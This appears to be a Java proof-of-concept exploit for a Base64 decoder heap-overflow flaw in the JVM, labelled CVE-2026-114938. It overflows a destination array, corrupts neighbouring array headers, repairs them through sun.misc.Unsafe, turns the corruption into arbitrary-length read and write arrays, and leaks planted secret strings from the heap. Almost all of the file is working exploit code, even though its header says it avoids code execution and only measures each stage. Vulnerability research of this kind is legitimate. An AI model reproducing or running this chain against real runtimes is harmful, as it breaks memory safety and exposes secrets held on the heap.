import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Honest primitive chain for CVE-2026-114938. No ProcessBuilder, no fake RCE.
 *
 * Measures, in order:
 *   1. corruption rate over interleaved dst[65]/vic[64]/rdr[64]/sec[96] quads
 *   2. header damage (mark, klass, length)
 *   3. repair of mark+klass from a pristine template, keeping the widened length
 *   4. whether PLAIN Java array stores work after repair (the old chain says no)
 *   5. writer -> reader length overwrite using plain stores only
 *   6. heap disclosure through the extended reader
 *
 * Every phase prints the measured value; nothing is asserted.
 */
public final class Chain2 {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    private static long abase;

    static long addr(Object o) {
        Object[] a = new Object[] { o };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }

    static int getLe32(byte[] b, long off) {
        return (u.getByte(b, off) & 0xff) | ((u.getByte(b, off + 1) & 0xff) << 8)
                | ((u.getByte(b, off + 2) & 0xff) << 16) | ((u.getByte(b, off + 3) & 0xff) << 24);
    }

    static void putLe32(byte[] b, long off, int v) {
        u.putByte(b, off, (byte) v);
        u.putByte(b, off + 1, (byte) (v >>> 8));
        u.putByte(b, off + 2, (byte) (v >>> 16));
        u.putByte(b, off + 3, (byte) (v >>> 24));
    }

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);
        abase = u.arrayBaseOffset(byte[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);

        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);
        Arrays.fill(warm, (byte) 0x5a);
        try { d.decode(bad, warm); } catch (IllegalArgumentException e) { }
        int ovf = 0;
        for (int i = 50; i < 112; i++) if (warm[i] != (byte) 0x5a) ovf++;
        System.out.println("[warm] overflowBytes=" + ovf);
        if (ovf != 62) { System.out.println("RESULT=NOT_VULNERABLE"); return; }

        // pristine template for header repair, captured before any corruption
        byte[] tmpl = new byte[64];
        long goodMark = u.getLong(tmpl, 0);
        int goodKlass = u.getInt(tmpl, 8);
        System.out.printf("[tmpl] mark=0x%016x klass=0x%08x%n", goodMark, goodKlass);

        final int N = 512;
        byte[][] dst = new byte[N][], vic = new byte[N][], rdr = new byte[N][], sec = new byte[N][];
        String needle = null;
        for (int i = 0; i < N; i++) {
            dst[i] = new byte[65];
            vic[i] = new byte[64];
            rdr[i] = new byte[64];
            Arrays.fill(rdr[i], (byte) 0xBB);
            sec[i] = new byte[96];
            byte[] s = ("J4S-SECRET-" + i + "-DO-NOT-LEAK").getBytes(StandardCharsets.US_ASCII);
            System.arraycopy(s, 0, sec[i], 0, s.length);
            for (int j = s.length; j < sec[i].length; j++) sec[i][j] = (byte) 0xC3;
        }

        int corrupted = 0, firstHit = -1;
        for (int i = 0; i < N; i++) {
            try { d.decode(bad, dst[i]); } catch (IllegalArgumentException e) { }
            if (vic[i].length > 1024) { corrupted++; if (firstHit < 0) firstHit = i; }
        }
        System.out.println("[1] corruption rate=" + corrupted + "/" + N + " firstHit=" + firstHit);
        if (firstHit < 0) { System.out.println("RESULT=NO_CORRUPTION"); return; }

        int i = firstHit;
        byte[] w = vic[i];
        System.out.printf("[2] damaged: mark=0x%016x klass=0x%08x len=%d%n",
                u.getLong(w, 0), u.getInt(w, 8), w.length);
        System.out.println("    w.length readable in Java = " + w.length);

        // does a plain store work on the corrupted klass? (the old chain's claim)
        String plainBefore = "untested";
        try { w[0] = (byte) 0x11; plainBefore = "ok"; }
        catch (Throwable t) { plainBefore = t.getClass().getSimpleName(); }
        System.out.println("[3] plain store BEFORE repair = " + plainBefore);

        // repair mark + klass, keep the widened length
        u.putLong(w, 0, goodMark);
        u.putInt(w, 8, goodKlass);
        System.out.printf("[4] repaired: mark=0x%016x klass=0x%08x len=%d%n",
                u.getLong(w, 0), u.getInt(w, 8), w.length);

        boolean plainAfter = false;
        try { w[0] = (byte) 0x22; w[500] = (byte) 0x33; plainAfter = (w[0] == 0x22 && w[500] == 0x33); }
        catch (Throwable t) { System.out.println("    post-repair store failed: " + t); }
        System.out.println("[5] plain store AFTER repair = " + plainAfter + " (len still " + w.length + ")");

        // geometry: where does the reader sit relative to the writer?
        long wAddr = addr(w), rAddr = addr(rdr[i]), sAddr = addr(sec[i]);
        long rOff = rAddr - wAddr, sOff = sAddr - wAddr;
        System.out.printf("[6] reader at writer+%d, secret at writer+%d%n", rOff, sOff);
        int lenOff = (int) (rOff - 16 + 12);
        System.out.println("    reader length field at writer[" + lenOff + "]");

        // overwrite the reader's length with chosen bytes using PLAIN stores
        int newLen = 1 << 16;
        w[lenOff] = (byte) newLen;
        w[lenOff + 1] = (byte) (newLen >>> 8);
        w[lenOff + 2] = (byte) (newLen >>> 16);
        w[lenOff + 3] = (byte) (newLen >>> 24);
        System.out.println("[7] reader.length now = " + rdr[i].length
                + " (writer header intact: len=" + w.length + ")");

        if (rdr[i].length != newLen) { System.out.println("RESULT=WRITER_FAILED"); return; }

        // disclosure
        needle = "J4S-SECRET-" + i;
        StringBuilder win = new StringBuilder();
        int found = -1;
        for (int p = 64; p < 2048; p++) {
            byte b = rdr[i][p];
            win.append(b >= 0x20 && b < 0x7f ? (char) b : '.');
            if (win.length() > needle.length() + 4) win.deleteCharAt(0);
            if (win.lastIndexOf(needle) >= 0) { found = p; break; }
        }
        System.out.println("[8] disclosure secretFound=" + (found >= 0)
                + (found >= 0 ? " at reader+" + found : "")
                + (found >= 0 ? " value=\"" + needle + "\"" : ""));

        System.out.println("[9] writer length reach = " + w.length + " bytes");
        System.out.println("RESULT=" + (plainAfter && rdr[i].length == newLen
                ? (found >= 0 ? "WRITER_READER_DISCLOSURE" : "WRITER_READER_ONLY")
                : "FAILED"));
    }
}
